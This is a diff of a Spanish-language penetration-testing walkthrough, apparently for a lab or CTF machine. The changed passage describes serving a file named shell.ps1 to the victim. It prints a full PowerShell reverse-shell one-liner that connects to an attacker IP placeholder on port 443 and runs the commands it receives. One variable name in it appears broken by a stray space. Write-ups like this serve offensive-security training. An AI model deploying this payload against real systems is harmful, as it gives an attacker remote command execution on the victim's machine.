@@ -216,7 +216,7 @@ SQL>
 ```
 Ahora que sabemos que podemos ejecutar comandos vamos a postear un servidor que aloje un archivito que nos descargamos para apuntar a el desde la maquina victima y que cuando se ejecute, nos lance una reverse_shell a nuestro equipo en el cual estaremos escuchando con netcat para recibir la conexion entrante.
 
-Empezamos creando el archivo malicioso:
+Empezamos creando el archivo malicioso: "Al que llamaremos shell.ps1"
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("CAMBIAR POR NUESTRA IP ATACANTE",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyt e.Length);$stream.Flush()};$client.Close()
 ```
